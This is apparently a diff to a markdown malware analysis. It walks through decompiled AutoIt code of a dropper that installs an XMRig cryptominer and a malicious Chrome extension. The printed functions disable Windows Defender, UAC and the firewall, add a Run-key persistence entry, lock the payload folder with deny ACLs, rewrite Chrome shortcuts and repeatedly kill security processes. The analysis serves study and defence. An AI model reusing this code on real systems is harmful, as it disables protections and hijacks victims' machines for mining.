@@ -470,3 +470,212 @@ Func main9() ; Extract the virus
 EndFunc
 ```
 <br> It extracts the archive downloaded (`files.7z`) by using 7-zip console app. The password of the archive is `KEQZmgbrmDnTpa2b4DHVMX` - as you can see in the command line
+<br> VirusTotal: [here](https://www.virustotal.com/gui/file/d6fccd97f041fb796963bf0b8566379eb1c53cfdd1409e6d39266e3deecf7321/detection). It won't be detected since the archive is protected by password.
+<br> After extractions, it has the following files in the directory:
+|File|Use|
+|----|----|
+|`background.js`|The background worker of the Chrome extension to load the JavaScript code from the server|
+|`config.json`|The json config for Xmrig miner - in this case the `update-x64.exe`|
+|`defender.exe`|Windows Defender disabler|
+|`setacl.exe`|An open souce tool for changing security permission in Windows|
+|`update-x64.exe`|Xmrig miner, but changed the icon and the infos|
+|`update-x86.exe`|Also Xmrig, but the 32 bit version (I don't know why)|
+|`WinRing0x64.sys`|To be loaded by Xmrig, `allow access to RDMSR, CPUID and RDTSC instructions` from Ring 3 in x86. This might be used by Xmrig to detect the hardware model to load the assembly accelerator|
+#### 10) 10th function: Kill Windows Defender
+```autoit
+Func main10() ; Kill Windows Defender
+	If @OSVersion = "WIN_10" Then ; Check if the windows version is Windows 10 - maybe to find Windows Defender?
+		Run($virusdir & "\" & "defender.exe /D", $virusdir, @SW_HIDE) ; Windows Defender disabler
+		ProcessClose("SecurityHealthHost.exe") ; Kill it! Easy like that?
+	EndIf
+	main11()
+EndFunc
+```
+<br> It kill Windows Defender with the `defender.exe` from `www.sordum.org`. This is a tool that people use to disable Windows Defender.
+<br> You can view it on VirusTotal [here](https://www.virustotal.com/gui/file/ce3a6224dae98fdaa712cfa6495cb72349f333133dbfb339c9e90699cbe4e8e4/detection), on Any.run [here](https://app.any.run/tasks/5b8bc7d6-48c3-4dfc-af25-a5accae0a937/)
+#### 11) 11th function: copy itself to the created directory
+```autoit
+Func main11() ; Copy itself to virus directory
+	FileCopy(@ScriptFullPath, $virusdir & "\app.exe", 1) ; Copy the current virus itself to the virus directory it created
+	main12()
+EndFunc
+```
+<br> It copy itself to the directory it has created, and rename to `app.exe`. In an infected machine, in that directory I didn't see `app.exe` for some reason.
+#### 12) 12th function: kill chrome
+```autoit
+Func main12() ; Kill Chrome
+	While WinGetHandle(REGEXPTITLE:(?i)(.*Chrome.*)) ; Kill chrome by get the handle
+		WinClose([REGEXPTITLE:(?i)(.*Chrome.*)])
+	WEnd
+	ProcessClose("chrome.exe")
+	ProcessWaitClose("chrome.exe") ; Kill it to install the extension
+	main13()
+EndFunc
+```
+<br> Kill Chrome to install the malicious extension.
+#### 13) 13th function: set permision for the directory
+```autoit
+Func main13() ; Protect itself from being deleted
+	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn setprot -op dacl:p_nc", $virusdir, @SW_HIDE)
+	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn ace -ace n:SYSTEM;p:del_child;m:deny -ace n:SYSTEM;p:delete;m:deny", $virusdir, @SW_HIDE)
+	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn ace -ace n:Administrators;p:del_child;m:deny -ace n:Administrators;p:delete;m:deny", $virusdir, @SW_HIDE)
+	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn ace -ace n:Users;p:del_child;m:deny -ace n:Users;p:delete;m:deny", $virusdir, @SW_HIDE)
+	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn ace -ace n:Everyone;p:del_child;m:deny -ace n:Everyone;p:delete;m:deny", $virusdir, @SW_HIDE)
+	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn setowner -ownr n:SYSTEM", $virusdir, @SW_HIDE)
+	main14()
+EndFunc
+```
+<br> `setacl` is an FOSS (LGPL v2) tools for modifing the security permission of Windows.
+<br> It use `setacl` to set the owner of the folder to `SYSTEM` to avoid being deleted
+<br> But you can always change the folder owner by using `Security` tab in `Folder Properties`
+#### 14) 14th function: write registry to disable antiviruses and change the Chrome Update
+```autoit
+Func main14() ; Write registry to disable antiviruses and change the Chrome Update
+	RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Associations", "LowRiskFileTypes", "REG_SZ", ".exe")
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", "Google Update", "REG_SZ", $virusdir & "\app.exe")
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "REG_DWORD", 0)
+	RegWrite("HKLM\Software\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "REG_DWORD", 1)
+	RegWrite("HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile", "EnableFirewall", "REG_DWORD", 0)
+	RegWrite("HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile", "DisableNotifications", "REG_DWORD", 1)
+	RegWrite("HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService", "Start", "REG_DWORD", 200)
+	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", "SecurityHealth")
+	main15()
+EndFunc
+```
+<br> It uses `RegWrite` to modify the system settings:
+- Set the `.exe` extension to Low Risk File (to avoid scanning and warnings)
+- Change the Google Chrome Updater to it malicious `app.exe`. That Google Chrome Updater auto start with Windows.
+- It disable UAC (User Account Control) to avoid being asked for Administrator operation comfirmation. After modify this, the system logout.
+- It disable Windows Defender
+- Disable Windows Firewall to connect to its server
+- Disable Security Health Service - part of Windows Defender
+- Delete Security Health Service from auto start apps.
+#### 15) 15th function: Execute chrome with malware extension
+```autoit
+Func main15() ; Insert malware extension to Chrome
+	ShellExecute("chrome.exe", "--enable-automation --restore-last-session --disable-blink-features=AutomationControlled --load-extension=" & $virusdir, "", "", @SW_MAXIMIZE)
+	main16()
+	zlmsyuslmwzh()
+EndFunc
+```
+<br> It load extension from the directory it created. After extract the archive, it has `manifest.json` and `background.js` to be loaded.
+<br> We will talk about the extension later.
+#### 16) 16th function and the rest: Replace Chrome shortcut with command line to load the extension
+```autoit
+Func main16() ; Replace Chrome shortcut with malware extension command line
+	Local $array2d[5][2] ; Setup an 2D array
+	$array2d[0][0] = @AppDataDir & "\Microsoft\Internet Explorer\Quick Launch"
+	$array2d[1][0] = @AppDataCommonDir & "\Microsoft\Internet Explorer\Quick Launch"
+	$array2d[2][0] = @DesktopDir
+	$array2d[3][0] = @ProgramsCommonDir
+	$array2d[4][0] = @DesktopCommonDir
+	$array2d[0][1] = 1
+	$array2d[1][1] = 1
+	$array2d[2][1] = 0
+	$array2d[3][1] = 0
+	$array2d[4][1] = 0
+	For $counter = 0 To 4
+		If $array2d[$counter][1] = 1 Then
+			ezmdwuawsws($array2d[$counter][0])
+		EndIf
+		sesrarlhuog($array2d[$counter][0])
+	Next
+EndFunc
+
+Func ezmdwuawsws($p)
+	Local $returnvalue = xpwtesac($p, "*", 2)
+	If @error = 0 Then
+		For $counter = 1 To $returnvalue[0]
+			sesrarlhuog($p & "\" & $returnvalue[$counter])
+			ezmdwuawsws($p & "\" & $returnvalue[$counter])
+		Next
+	EndIf
+EndFunc
+
+Func sesrarlhuog($dgtnmsyt)
+	Local $qfmiznc = xpwtesac($dgtnmsyt, "*.lnk")
+	If @error = 0 Then
+		$hajaxgrbel = $qfmiznc[0]
+		For $counter = 1 To $hajaxgrbel
+			ajaqfqn($dgtnmsyt & '\' & $qfmiznc[$counter])
+		Next
+	EndIf
+EndFunc
+
+Func ajaqfqn($kxpdbrfgb) ; Check shortcut name. "chrome" or "chromium" also work.
+	$gfwbjvvluo = FileGetShortcut($kxpdbrfgb)
+	If NOT @error Then
+		$agbhl = vpmfq($gfwbjvvluo[0], "", "", "", "")
+		If $agbhl[3] = "chrome" Then
+			fuaxi($gfwbjvvluo, $kxpdbrfgb)
+		EndIf
+	EndIf
+EndFunc
+
+Func fuaxi($gfwbjvvluo, $kxpdbrfgb) ; Chrome shortcut with malaware extension
+	FileCreateShortcut($gfwbjvvluo[0], $kxpdbrfgb, $gfwbjvvluo[1], "--enable-automation --disable-blink-features=AutomationControlled --load-extension=" & $virusdir)
+EndFunc
+
+Func zlmsyuslmwzh() ; Inject fake update service to Chrome and kill Windows Defender
+	If "X86" = "X64" Then ; Originally @CPUArch
+		$toujmktea = "update-x64.exe"
+	Else
+		$toujmktea = "update-x86.exe"
+	EndIf
+	While 1
+		If FileExists($virusdir & "\" & $toujmktea) Then
+			If NOT ProcessExists($toujmktea) Then
+				Run($virusdir & "\" & $toujmktea, $virusdir, @SW_HIDE)
+			EndIf
+		EndIf
+		ProcessClose("software_reporter_tool.exe")
+		ProcessClose("MsMpEng.exe")
+		ProcessClose("SecurityHealthHost.exe")
+		ProcessClose("SecurityHealthService.exe")
+		Sleep(3000)
+	WEnd
+EndFunc
+
+Func xpwtesac($p1, $p2 = "*", $p3 = 0, $p4 = False)
+	Local $var1 = "", $var2 = "", $var3 = ""
+	$p1 = StringRegExpReplace($p1, "[\\/]+$", "") & "\"
+	If $p3 = Default Then $p3 = 0
+	If $p4 Then $var3 = $p1
+	If $p2 = Default Then $p2 = "*"
+	If NOT FileExists($p1) Then Return SetError(1, 0, 0)
+	If StringRegExp($p2, "[\\/:><\|]|(?s)^\s*$") Then Return SetError(2, 0, 0)
+	If NOT ($p3 = 0 OR $p3 = 1 OR $p3 = 2) Then Return SetError(3, 0, 0)
+	Local $filepointer = FileFindFirstFile($p1 & $p2)
+	If @error Then Return SetError(4, 0, 0)
+	While 1
+		$var2 = FileFindNextFile($filepointer)
+		If @error Then ExitLoop
+		If ($p3 + @extended = 2) Then ContinueLoop
+		$var1 &= "|" & $var3 & $var2
+	WEnd
+	FileClose($filepointer)
+	If $var1 = "" Then Return SetError(4, 0, 0)
+	Return StringSplit(StringTrimLeft($var1, 1), "|")
+EndFunc
+
+Func vpmfq($p1, $mnjxaygqfkun, $ekbgffqnc, $var2, $rkeywqqfeyg)
+	Local $nhpcr = StringRegExp($p1, "^\h*((?:\\\\\?\\)*(\\\\[^\?\/\\]+|[A-Za-z]:)?(.*[\/\\]\h*)?((?:[^\.\/\\]|(?(?=\.[^\/\\]*\.)\.))*)?([^\/\\]*))$", 1)
+	If @error Then
+		ReDim $nhpcr[5]
+		$nhpcr[0] = $p1
+	EndIf
+	$mnjxaygqfkun = $nhpcr[1]
+	If StringLeft($nhpcr[2], 1) == "/" Then
+		$ekbgffqnc = StringRegExpReplace($nhpcr[2], "\h*[\/\\]+\h*", "\/")
+	Else
+		$ekbgffqnc = StringRegExpReplace($nhpcr[2], "\h*[\/\\]+\h*", "\\")
+	EndIf
+	$nhpcr[2] = $ekbgffqnc
+	$var2 = $nhpcr[3]
+	$rkeywqqfeyg = $nhpcr[4]
+	Return $nhpcr
+EndFunc
+```
+<br> They use some Regular Expression to find the chrome shortcut, then insert to it.
+<br> `chrome` or `chromium` (the open source version and also the core part of Chrome) also work.
+<br> Im not going to look carefully in this part.
